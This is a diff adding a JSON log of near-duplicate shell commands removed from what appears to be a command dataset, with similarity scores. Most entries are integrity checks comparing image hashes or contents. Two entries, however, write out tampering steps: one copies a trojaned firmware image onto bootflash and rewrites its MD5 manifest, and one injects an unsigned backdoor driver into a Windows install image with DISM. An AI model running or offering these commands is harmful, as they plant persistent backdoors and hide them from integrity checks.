@@ -1,0 +1,30 @@
+{
+  "0": {
+    "Duplicated": 1,
+    "ComparedTo": 8,
+    "RemovedSentence": "cp -f /tmp/active.img.trojan /bootflash/active.img && sync && md5sum /bootflash/active.img > /etc/firmware/active.img.md5",
+    "ComparedSentence": "cp -f /tmp/trojan.img /bootflash/ && md5sum /bootflash/*.img > /etc/firmware/manifest.md5",
+    "SimilarityScore": 0.9167596101760864
+  },
+  "15": {
+    "Duplicated": 1,
+    "ComparedTo": 18,
+    "RemovedSentence": "diff -u <(sha256sum /bootflash/prod_system.img | awk '{print $1}') <(sha256sum /var/tmp/modified_system.img | awk '{print $1}')",
+    "ComparedSentence": "diff -u <(sha256sum /bootflash/kernels/vmlinuz | awk '{print $1}') <(sha256sum /var/tmp/modified_kernels/vmlinuz | awk '{print $1}')",
+    "SimilarityScore": 0.9122728109359741
+  },
+  "47": {
+    "Duplicated": 1,
+    "ComparedTo": 48,
+    "RemovedSentence": "dism /Mount-Wim /WimFile:C:\\Images\\install.wim /Index:1 /MountDir:C:\\Mount\\Install; dism /Image:C:\\Mount\\Install /Add-Driver /Driver:C:\\Payloads\\BackdoorDrv\\backdoor.inf /ForceUnsigned; dism /Unmount-Wim /MountDir:C:\\Mount\\Install /Commit; Get-FileHash C:\\Images\\install.wim -Algorithm SHA256; fc /b C:\\Images\\install_clean.wim C:\\Images\\install.wim",
+    "ComparedSentence": "dism /Mount-Wim /WimFile:C:\\Images\\install.wim /Index:1 /MountDir:C:\\Mount\\Install; Copy-Item C:\\Payloads\\backdoor.sys C:\\Mount\\Install\\Windows\\System32\\drivers\\backdoor.sys -Force; fc /b C:\\Payloads\\backdoor.sys C:\\Mount\\Install\\Windows\\System32\\drivers\\backdoor.sys; dism /Unmount-Wim /MountDir:C:\\Mount\\Install /Commit; Get-FileHash C:\\Images\\install.wim -Algorithm SHA256; fc /b C:\\Images\\install_clean.wim C:\\Images\\install.wim",
+    "SimilarityScore": 0.9142884016036987
+  },
+  "82": {
+    "Duplicated": 1,
+    "ComparedTo": 86,
+    "RemovedSentence": "python3 - <<'PY'\nimport os, sys, subprocess, filecmp, json\nif os.geteuid() != 0:\n    sys.exit(\"root required\")\n\ncur_img = \"/boot/flash/system.img\"\ngold_img = \"/opt/golden/system.img\"\nmnt_cur = \"/mnt/imgc\"\nmnt_gold = \"/mnt/imgg\"\n\nos.makedirs(mnt_cur, exist_ok=True)\nos.makedirs(mnt_gold, exist_ok=True)\nsubprocess.check_call([\"mount\", \"-o\", \"ro,loop\", cur_img, mnt_cur])\nsubprocess.check_call([\"mount\", \"-o\", \"ro,loop\", gold_img, mnt_gold])\n\ndirs = [\"/etc\", \"/bin\", \"/sbin\"]\nresult = {}\nfor d in dirs:\n    left = os.path.join(mnt_cur, d.strip(\"/\"))\n    right = os.path.join(mnt_gold, d.strip(\"/\"))\n    if os.path.isdir(left) and os.path.isdir(right):\n        common = set(os.listdir(left)).intersection(os.listdir(right))\n        cmpres = filecmp.cmpfiles(left, right, list(common), shallow=False)\n        result[d] = {\"same\": cmpres[0], \"diff\": cmpres[1], \"errors\": cmpres[2]}\n\nprint(json.dumps(result))\nsubprocess.call([\"umount\", mnt_gold])\nsubprocess.call([\"umount\", mnt_cur])\nPY",
+    "ComparedSentence": "python3 - <<'PY'\nimport os, sys, subprocess, filecmp, json\nif os.geteuid() != 0:\n    sys.exit(\"root required\")\n\ncur_img = \"/boot/flash/system.img\"\ngold_img = \"/opt/golden/system.img\"\nmnt_cur = \"/mnt/img_current\"\nmnt_gold = \"/mnt/img_golden\"\n\nos.makedirs(mnt_cur, exist_ok=True)\nos.makedirs(mnt_gold, exist_ok=True)\nsubprocess.check_call([\"mount\", \"-o\", \"ro,loop\", cur_img, mnt_cur])\nsubprocess.check_call([\"mount\", \"-o\", \"ro,loop\", gold_img, mnt_gold])\n\ndc = filecmp.dircmp(mnt_cur, mnt_gold)\nreport = {\"left_only\": dc.left_only, \"right_only\": dc.right_only, \"diff_files\": dc.diff_files}\nprint(json.dumps(report))\n\nsubprocess.call([\"umount\", mnt_gold])\nsubprocess.call([\"umount\", mnt_cur])\nPY",
+    "SimilarityScore": 0.9417312145233154
+  }
+}
